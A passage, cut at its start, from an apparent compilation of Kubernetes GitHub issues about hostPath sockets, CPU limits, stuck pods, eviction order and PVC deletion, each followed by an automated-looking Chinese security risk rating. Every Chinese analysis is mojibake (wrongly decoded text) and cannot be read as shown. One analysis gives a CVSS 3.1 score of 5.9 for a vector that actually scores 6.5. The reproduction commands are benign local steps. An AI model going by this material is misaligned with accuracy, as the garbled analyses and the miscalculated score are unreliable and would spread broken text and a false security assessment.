è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºé…ç½®å†²çªå¯¼è‡´çš„ï¼Œå±äºè¿ç»´å’Œé…ç½®ç®¡ç†çš„é—®é¢˜ã€‚æ”»å‡»è€…éœ€è¦å…·å¤‡å¯¹StatefulSetçš„ä¿®æ”¹æƒé™æˆ–è€…èƒ½å¤Ÿåˆ é™¤Podå’ŒPVCçš„æƒé™æ‰èƒ½è§¦å‘è¯¥é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šéœ€è¦æ”»å‡»è€…å…·å¤‡å¯¹StatefulSetæˆ–é›†ç¾¤èµ„æºçš„ä¿®æ”¹æƒé™ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ”»å‡»è€…éœ€è¦ä¸€å®šçš„æƒé™æ‰èƒ½åˆ©ç”¨è¯¥é—®é¢˜ï¼ŒæŒ‰ç…§CVSSè¯„åˆ†ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
4. **å½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹**ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠé«˜é£é™©çš„å®‰å…¨æ¼æ´ã€‚

---

## Issue #128814 `volumes[*].hostPath.type: Socket` doesnâ€™t prevent the kubelet from creating a directory instead of waiting for a UNIX socket to be created.

- Issue é“¾æ¥ï¼š[#128814](https://github.com/kubernetes/kubernetes/issues/128814)

### Issue å†…å®¹

#### What happened?

[`hostPath` volumes have different types](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath-volume-types).
By default, no check is done. Whatever is found is bind-mounted and, if nothing exists, a directory is created on the host.
But, if the type is `Socket`, the kubelet is supposed to check that a UNIX socket exists at the expected location before starting the pod.

Yet, if the container restarts after the UNIX socket has disappeared, then a directory is created instead.
This leads to an unrecoverable issue because the directory will prevent the server from eventually re-creating the UNIX socket.

#### What did you expect to happen?

If a container mounting a `Socket` `hostPath` restarts after the socket has been deleted, it should hang until the socket comes back.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod that mounts a socket:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: foo
  labels:
    app: foo
spec:
  replicas: 1
  selector:
    matchLabels:
      app: foo
  template:
    metadata:
      labels:
        app: foo
    spec:
      containers:
        - name: sleeper
          image: busybox
          command:
            - sleep
            - infinity
          volumeMounts:
            - name: socket
              mountPath: /tmp/foo.sock
      volumes:
        - name: socket
          hostPath:
            path: /tmp/foo.sock
            type: Socket
```

The pod initially remains pending because thereâ€™s no UNIX socket at `/tmp/foo.sock`:

```console
$ kubectl get pods
NAME                  READY   STATUS              RESTARTS   AGE
foo-976c59756-gw2zd   0/1     ContainerCreating   0          97s
$ kubectl describe pod/foo-976c59756-gw2zd 
Name:             foo-976c59756-gw2zd
Namespace:        foo
Priority:         0
Service Account:  default
Node:             gke-gke-lenaic-ubuntu-containerd-38134859-476h/10.0.96.131
Start Time:       Fri, 15 Nov 2024 16:33:09 +0100
Labels:           app=foo
                  pod-template-hash=976c59756
Annotations:      <none>
Status:           Pending
IP:               
IPs:              <none>
Controlled By:    ReplicaSet/foo-976c59756
Containers:
  sleeper:
    Container ID:  
    Image:         busybox
    Image ID:      
    Port:          <none>
    Host Port:     <none>
    Command:
      sleep
      infinity
    State:          Waiting
      Reason:       ContainerCreating
    Ready:          False
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /tmp/foo.sock from socket (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-52bxl (ro)
Conditions:
  Type                        Status
  PodReadyToStartContainers   False 
  Initialized                 True 
  Ready                       False 
  ContainersReady             False 
  PodScheduled                True 
Volumes:
  socket:
    Type:          HostPath (bare host directory volume)
    Path:          /tmp/foo.sock
    HostPathType:  Socket
  kube-api-access-52bxl:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              cloud.google.com/gke-nodepool=ubuntu-containerd
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason       Age                  From               Message
  ----     ------       ----                 ----               -------
  Normal   Scheduled    2m20s                default-scheduler  Successfully assigned foo/foo-976c59756-gw2zd to gke-gke-lenaic-ubuntu-containerd-38134859-476h
  Warning  FailedMount  12s (x9 over 2m20s)  kubelet            MountVolume.SetUp failed for volume "socket" : hostPath type check failed: /tmp/foo.sock is not a socket file
```

This is expected.

Then, create the UNIX socket on the node:

```console
# timeout 1 nc -lU /tmp/foo.sock
# ls -l /tmp/foo.sock
srwxr-xr-x 1 root root 0 Nov 15 15:38 /tmp/foo.sock
```

The pod transitions to `Running` state and the containers are started:

```console
$ kubectl describe pod/foo-976c59756-gw2zd 
Name:             foo-976c59756-gw2zd
Namespace:        foo
Priority:         0
Service Account:  default
Node:             gke-gke-lenaic-ubuntu-containerd-38134859-476h/10.0.96.131
Start Time:       Fri, 15 Nov 2024 16:33:09 +0100
Labels:           app=foo
                  pod-template-hash=976c59756
Annotations:      <none>
Status:           Running
IP:               10.4.1.6
IPs:
  IP:           10.4.1.6
Controlled By:  ReplicaSet/foo-976c59756
Containers:
  sleeper:
    Container ID:  containerd://3a6b9dab9a721eba41c8bbb8d5783ec952e1c37e8bafef634d0ece8fa2b8b2a1
    Image:         busybox
    Image ID:      docker.io/library/busybox@sha256:768e5c6f5cb6db0794eec98dc7a967f40631746c32232b78a3105fb946f3ab83
    Port:          <none>
    Host Port:     <none>
    Command:
      sleep
      infinity
    State:          Running
      Started:      Fri, 15 Nov 2024 16:39:23 +0100
    Ready:          True
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /tmp/foo.sock from socket (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-52bxl (ro)
Conditions:
  Type                        Status
  PodReadyToStartContainers   True 
  Initialized                 True 
  Ready                       True 
  ContainersReady             True 
  PodScheduled                True 
Volumes:
  socket:
    Type:          HostPath (bare host directory volume)
    Path:          /tmp/foo.sock
    HostPathType:  Socket
  kube-api-access-52bxl:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              cloud.google.com/gke-nodepool=ubuntu-containerd
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason       Age                     From               Message
  ----     ------       ----                    ----               -------
  Normal   Scheduled    6m46s                   default-scheduler  Successfully assigned foo/foo-976c59756-gw2zd to gke-gke-lenaic-ubuntu-containerd-38134859-476h
  Warning  FailedMount  2m36s (x10 over 6m46s)  kubelet            MountVolume.SetUp failed for volume "socket" : hostPath type check failed: /tmp/foo.sock is not a socket file
  Normal   Pulling      33s                     kubelet            Pulling image "busybox"
  Normal   Pulled       32s                     kubelet            Successfully pulled image "busybox" in 1.273s (1.273s including waiting). Image size: 2166802 bytes.
  Normal   Created      32s                     kubelet            Created container sleeper
  Normal   Started      32s                     kubelet            Started container sleeper
```

This is still fine.

Then, delete the UNIX socket from the node:

```console
# rm /tmp/foo.sock
# ls -l /tmp/foo.sock
ls: cannot access '/tmp/foo.sock': No such file or directory
```

And crash the container that mounts the socket to force its restart:

```console
# pkill -KILL -f "sleep infinity"
```

Then, once the container has restarted, `/tmp/foo.sock` becomes a directory:

```console
# ls -l /tmp/foo.sock
total 0
# ls -ld /tmp/foo.sock
drwxr-xr-x 2 root root 4096 Nov 15 15:46 /tmp/foo.sock
```

#### Anything else we need to know?

In real life, this bug affects situations where we have two pods communicating through a UNIX socket shared via a `hostPath` volume:
* A â€œserverâ€ pod has a `hostPath` volume for a directory on the host and creates a UNIX socket inside this directory.
* A â€œclientâ€ pod has a `hostPath` volume for the UNIX socket.

If the container of the â€œclientâ€ pod restarts while the â€œserverâ€ pod is cleanly redeployed (and the â€œserverâ€ process deletes the UNIX socket when shutdown), then a directory is created and it will prevent the â€œserverâ€ pod from re-creating it forever.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.1-gke.1678000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux gke-gke-lenaic-ubuntu-containerd-38134859-476h 5.15.0-1067-gke #73-Ubuntu SMP Sat Aug 31 04:29:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¿™ä¸ª Issue æè¿°äº†å½“ä½¿ç”¨ `hostPath` å·ç±»å‹ä¸º `Socket` æ—¶ï¼Œå¦‚æœå®¹å™¨é‡å¯å Unix socket æ¶ˆå¤±ï¼Œkubelet ä¼šåœ¨ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œè€Œä¸æ˜¯ç­‰å¾… socket é‡æ–°å‡ºç°ã€‚è¿™ä¼šå¯¼è‡´ä¸€ä¸ªä¸å¯æ¢å¤çš„é—®é¢˜ï¼Œå› ä¸ºåˆ›å»ºçš„ç›®å½•ä¼šé˜»æ­¢æœåŠ¡å™¨é‡æ–°åˆ›å»º Unix socketã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªé—®é¢˜å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå› ä¸ºç›®å½•çš„å­˜åœ¨é˜»æ­¢äº† socket çš„é‡æ–°åˆ›å»ºï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚

ç„¶è€Œï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- æ”»å‡»è€…éœ€è¦å…·å¤‡ä¸€å®šçš„æƒé™æ‰èƒ½å®æ–½æ­¤æ”»å‡»ï¼Œéœ€è¦èƒ½å¤Ÿé…ç½® `hostPath` å·å¹¶éƒ¨ç½² Podã€‚è¿™é€šå¸¸éœ€è¦æ›´é«˜çš„æƒé™ï¼Œä¸æ˜¯ä½æƒé™ç”¨æˆ·èƒ½å¤Ÿåšåˆ°çš„ã€‚

- å¯¹äºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™åº”å½“é™çº§å¤„ç†ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

å› æ­¤ï¼Œç»¼åˆè€ƒè™‘ï¼Œè¿™ä¸ªé—®é¢˜å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§åœ¨ high ä»¥ä¸‹ï¼Œåˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #128769 [FG:InPlacePodVerticalScaling] containers with a CPU limit below 10m have a resize status of InProgress indefinetly

- Issue é“¾æ¥ï¼š[#128769](https://github.com/kubernetes/kubernetes/issues/128769)

### Issue å†…å®¹

There is an implicit minimum of `10m` for CPU limits, so the actual resource limit is always clamped at a minimum of 10m. If the desired CPU limit is below 10m, the comparison of desired == actual fails, and the resize status is set to in-progress.

This is very similar to the case of minimum shares addressed in https://github.com/kubernetes/kubernetes/pull/128680

/kind bug
/sig node
/priority important-soon
/milestone v1.32

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“å®¹å™¨çš„CPUé™åˆ¶è®¾å®šä¸ºä½äº`10m`æ—¶ï¼Œå®é™…çš„èµ„æºé™åˆ¶ä¼šè¢«æœ€å°å€¼`10m`æ‰€æ›¿ä»£ã€‚å› æ­¤ï¼Œå½“æœŸæœ›çš„CPUé™åˆ¶ä½äº`10m`æ—¶ï¼Œå®é™…é™åˆ¶å’ŒæœŸæœ›é™åˆ¶ä¸ä¸€è‡´ï¼Œå¯¼è‡´å®¹å™¨çš„è°ƒæ•´çŠ¶æ€ï¼ˆresize statusï¼‰ä¸€ç›´å¤„äº`InProgress`çŠ¶æ€ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´èµ„æºç®¡ç†çš„é—®é¢˜ï¼Œä¾‹å¦‚å®¹å™¨æ— æ³•æ­£ç¡®è°ƒæ•´èµ„æºé™åˆ¶ï¼Œå¯èƒ½å½±å“ç³»ç»Ÿçš„èµ„æºåˆ†é…æ•ˆç‡ã€‚ä½†è¦åˆ©ç”¨è¿™ä¸€é—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡ä¿®æ”¹å®¹å™¨CPUé™åˆ¶çš„æƒé™ï¼Œè¿™é€šå¸¸æ˜¯å—é™åˆ¶çš„æ“ä½œã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬4æ¡æŒ‡å‡ºï¼Œå½“æ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å®æ–½æ”»å‡»ï¼Œä¸”éœ€è¦åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œæ­¤é—®é¢˜å±äºä½é£é™©ã€‚

---

## Issue #128739 The pod is in Terminating state and cannot be deleted.

- Issue é“¾æ¥ï¼š[#128739](https://github.com/kubernetes/kubernetes/issues/128739)

### Issue å†…å®¹

#### What happened?

After the pod is created, kubelet is attaching volumes. One volume of the csi type fails to be attached. When the pod is deleted, kubelet displays the DELETE log. However, the volume still fails to be attached. However, the volume that fails to be attached is not detached in the volume detaching process. In this case, the pod is always in the Terminating state.

Here are some of the logsï¼š
kubelet.log_20241110-011239.gz:I1109 15:20:58.829354  991024 reconciler_common.go:231] "operationExecutor.MountVolume started for volume \"log\" (UniqueName: \"kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log\") pod \"apicatalogmgrservice-76cb4ddf47-gcqdc\" (UID: \"611e4a7f-e11c-4a85-a9de-c12786553c1b\") " pod="sop/apicatalogmgrservice-76cb4ddf47-gcqdc"
kubelet.log_20241110-011239.gz:I1109 15:21:07.311383  991024 kubelet.go:2446] "SyncLoop DELETE" source="api" pods=["sop/apicatalogmgrservice-76cb4ddf47-gcqdc"]
kubelet.log_20241110-011239.gz:E1109 15:22:58.832641  991024 nestedpendingoperations.go:348] Operation for "{volumeName:kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log podName:611e4a7f-e11c-4a85-a9de-c12786553c1b nodeName:}" failed. No retries permitted until 2024-11-09 15:23:02.832622173 +0000 UTC m=+217774.838649689 (durationBeforeRetry 4s). Error: MountVolume.SetUp failed for volume "log" (UniqueName: "kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log") pod "apicatalogmgrservice-76cb4ddf47-gcqdc" (UID: "611e4a7f-e11c-4a85-a9de-c12786553c1b") : rpc error: code = Unknown desc = malformed header: missing HTTP content-type

However, the operationExecutor.UnmountVolume started log is not displayed.

Only the following information is seen
kubelet.log_20241110-011239.gz:I1109 15:22:58.950400  991024 reconciler_common.go:300] "Volume detached for volume \"log\" (UniqueName: \"kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log\") on node \"master2\" DevicePath \"\""



#### What did you expect to happen?

The pod should be correctly deleted or the volume that fails to be attached should trigger the volume detaching process.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod and ensure that a volume fails to be attached to a csi volume. Delete the pod. After the pod is deleted, the volume fails to be attached to the volume again. Then, the pod remains in the Terminating state.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.31
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨CSIå·çš„æƒ…å†µä¸‹ï¼Œè‹¥å·çš„æŒ‚è½½å¤±è´¥ï¼Œç„¶ååˆ é™¤Podï¼Œå¯¼è‡´Podä¸€ç›´å¤„äºTerminatingçŠ¶æ€ï¼Œæ— æ³•åˆ é™¤ã€‚ç”±äºå·æœªæ­£ç¡®å¸è½½ï¼ŒPodæ— æ³•æ­£å¸¸ç»ˆæ­¢ã€‚è¿™å¯èƒ½å¯¼è‡´èµ„æºæ³„éœ²ï¼Œç³»ç»Ÿä¸­æ®‹ç•™å¤§é‡æ— æ³•åˆ é™¤çš„Podï¼Œå¯èƒ½é€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»çš„é£é™©ã€‚

ç„¶è€Œï¼Œè¦åˆ©ç”¨æ­¤é—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºç‰¹å®šPodçš„æƒé™ï¼Œèƒ½å¤Ÿé…ç½®å¤±è´¥çš„CSIå·æŒ‚è½½ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…éœ€è¦ä¸€å®šçš„æƒé™æ‰èƒ½å®æ–½è¯¥æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥Issueæ¶‰åŠçš„å®‰å…¨é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128790 Eviction manager should evict terminated pods before running pods

- Issue é“¾æ¥ï¼š[#128790](https://github.com/kubernetes/kubernetes/issues/128790)

### Issue å†…å®¹

#### What happened?

Consider two pods are running on the node:
1.  pod with a large image size but in terminated state.
2.  running pod which is utilizing disk space just above the eviction limit.

kubelet's eviction manager will evict the running pod first instead of evicting the terminated pod and cleaning up the image.

#### What did you expect to happen?

kubelet should evict terminated pods and clean up images first beforing deciding to evict the running pod.

#### How can we reproduce it (as minimally and precisely as possible)?

1. create a pod with large image size and let it run to completion (you can write some data to writable layers if there's no large image).
2. create a pod with different image but it should utilize disk space until eviction limit.
3. watch kubelet evict the running pod first.

#### Anything else we need to know?

I think we should modify our node reclaim funcs to prioritize terminated pods first - https://github.com/kubernetes/kubernetes/blob/c9092f69fc0c099062dd23cd6ee226bcd52ec790/pkg/kubelet/eviction/helpers.go#L1222

#### Kubernetes version

<details>

```console
$ kubectl version
1.31
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
**é—®é¢˜æè¿°ï¼š**

åœ¨ Kubernetes ä¸­ï¼Œå½“èŠ‚ç‚¹ç£ç›˜ç©ºé—´ä¸è¶³æ—¶ï¼Œkubelet çš„é©±é€ç®¡ç†å™¨ï¼ˆeviction managerï¼‰ä¼šæ ¹æ®èµ„æºä½¿ç”¨æƒ…å†µé©±é€ Podã€‚å½“å‰çš„è¡Œä¸ºæ˜¯ï¼Œå³ä½¿å­˜åœ¨å·²ç»ˆæ­¢çš„ Podï¼ˆTerminated Podsï¼‰å ç”¨äº†å¤§é‡ç£ç›˜ç©ºé—´ï¼Œkubelet ä»å¯èƒ½ä¼˜å…ˆé©±é€æ­£åœ¨è¿è¡Œçš„ Podï¼Œè€Œä¸æ˜¯å…ˆæ¸…ç†å·²ç»ˆæ­¢çš„ Pod åŠå…¶å ç”¨çš„é•œåƒã€‚

**æ½œåœ¨é£é™©ï¼š**

åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒæˆ–å…±äº«é›†ç¾¤ä¸­ï¼Œä½æƒé™ç”¨æˆ·å¯èƒ½é€šè¿‡ä»¥ä¸‹æ–¹å¼é€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼š

1. åˆ›å»ºä¸€ä¸ªå ç”¨å¤§é‡ç£ç›˜ç©ºé—´çš„ Podï¼Œå¹¶è®©å…¶è¿è¡Œå®Œæˆï¼ˆç»ˆæ­¢ï¼‰ã€‚
2. ç”±äºå·²ç»ˆæ­¢çš„ Pod åŠå…¶é•œåƒä»å ç”¨ç£ç›˜ç©ºé—´ï¼Œå¯¼è‡´èŠ‚ç‚¹ç£ç›˜ç©ºé—´æ¥è¿‘æˆ–è¾¾åˆ°é©±é€é˜ˆå€¼ã€‚
3. kubelet åœ¨ç£ç›˜å‹åŠ›ä¸‹ï¼Œå¯èƒ½ä¼˜å…ˆé©±é€å…¶ä»–æ­£åœ¨è¿è¡Œçš„ Podï¼ˆå¯èƒ½å±äºå…¶ä»–ç”¨æˆ·æˆ–å…³é”®æœåŠ¡ï¼‰ï¼Œè€Œä¸æ˜¯æ¸…ç†å·²ç»ˆæ­¢çš„ Podã€‚

è¿™å¯èƒ½å¯¼è‡´å…¶ä»–ç”¨æˆ·çš„æœåŠ¡è¢«ä¸­æ–­ï¼Œå½±å“é›†ç¾¤çš„ç¨³å®šæ€§å’Œå¯ç”¨æ€§ã€‚

**é£é™©è¯„ä¼°ï¼š**

æ ¹æ® CVSS 3.1 è¯„åˆ†æ ‡å‡†ï¼š

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰ï¼š** ç½‘ç»œï¼ˆNï¼‰
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰ï¼š** ä½ï¼ˆLï¼‰
- **æƒé™è¦æ±‚ï¼ˆPRï¼‰ï¼š** ä½ï¼ˆLï¼‰â€”â€”æ”»å‡»è€…éœ€è¦èƒ½åœ¨é›†ç¾¤ä¸­åˆ›å»º Pod çš„æƒé™
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰ï¼š** æ— éœ€ï¼ˆNï¼‰
- **ä½œç”¨èŒƒå›´ï¼ˆSï¼‰ï¼š** æœªæ”¹å˜ï¼ˆUï¼‰
- **æœºå¯†æ€§ï¼ˆCï¼‰ï¼š** æ— å½±å“ï¼ˆNï¼‰
- **å®Œæ•´æ€§ï¼ˆIï¼‰ï¼š** æ— å½±å“ï¼ˆNï¼‰
- **å¯ç”¨æ€§ï¼ˆAï¼‰ï¼š** é«˜ï¼ˆHï¼‰

æ ¹æ®ä¸Šè¿°æŒ‡æ ‡ï¼Œç»¼åˆå¾—åˆ†ä¸º 5.9ï¼Œå±äºä¸­ç­‰é£é™©ï¼ˆMediumï¼‰ã€‚

**ç»“è®ºï¼š**

è¯¥é—®é¢˜å­˜åœ¨å®‰å…¨é£é™©ï¼Œå¯èƒ½è¢«ä½æƒé™ç”¨æˆ·åˆ©ç”¨ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·çš„ Pod è¢«é©±é€ï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ä½†ç”±äºéœ€è¦å…·å¤‡åˆ›å»º Pod çš„æƒé™ï¼Œä¸”å¯¹é›†ç¾¤å…¶ä»–æ–¹é¢å½±å“æœ‰é™ï¼Œæ•…é£é™©è¯„çº§åˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #128695 PersistentVolumeClaim cannot be deleted.

- Issue é“¾æ¥ï¼š[#128695](https://github.com/kubernetes/kubernetes/issues/128695)

### Issue å†…å®¹

#### What happened?

https://github.com/kubernetes/kubernetes/blob/c25f5eefe4efda4c0d9561d06942cd3de3dfe2e4/pkg/controller/volume/pvcprotection/pvc_protection_controller.go#L374-L388
If a pod with UnexpectedAdmissionError exists in the environment and PersistentVolumeClaim is used, the PVC cannot be deleted after the pod is deleted. The controller-manager log shows that Pod uses PVC xxx. Check the code and find that the podUsesPVC method does not determine the pod status. I think this is a problem.

#### What did you expect to happen?

The pvc should be deleted correctly.

#### How can we reproduce it (as minimally and precisely as possible)?

Construct a pod in the UnexpectedAdmissionError state, configure a PVC, and delete the pod that is using the PVC.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.31
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡ºï¼Œå½“ç¯å¢ƒä¸­å­˜åœ¨çŠ¶æ€ä¸ºUnexpectedAdmissionErrorçš„Podå¹¶ä½¿ç”¨PersistentVolumeClaimï¼ˆPVCï¼‰æ—¶ï¼Œå³ä½¿åˆ é™¤äº†è¯¥Podï¼ŒPVCä¹Ÿæ— æ³•è¢«åˆ é™¤ã€‚æ£€æŸ¥ä»£ç åå‘ç°ï¼Œ`podUsesPVC`æ–¹æ³•æ²¡æœ‰åˆ¤æ–­Podçš„çŠ¶æ€ï¼Œå¯¼è‡´æ§åˆ¶å™¨ä»ç„¶è®¤ä¸ºPVCè¢«Podä½¿ç”¨ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼Œè¿™ç§æƒ…å†µå¯èƒ½å¯¼è‡´èµ„æºæ— æ³•é‡Šæ”¾ï¼Œè¿›è€Œå¯èƒ½è¢«æ¶æ„ç”¨æˆ·åˆ©ç”¨ï¼Œé€šè¿‡åˆ›å»ºå¤§é‡å¼‚å¸¸çŠ¶æ€çš„Podå¹¶ç»‘å®šPVCï¼Œå¯¼è‡´PVCæ— æ³•åˆ é™¤ï¼Œé€ æˆå­˜å‚¨èµ„æºè€—å°½ï¼Œå±äºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼šå½“é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™åº”é™çº§å¤„ç†ã€‚å½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

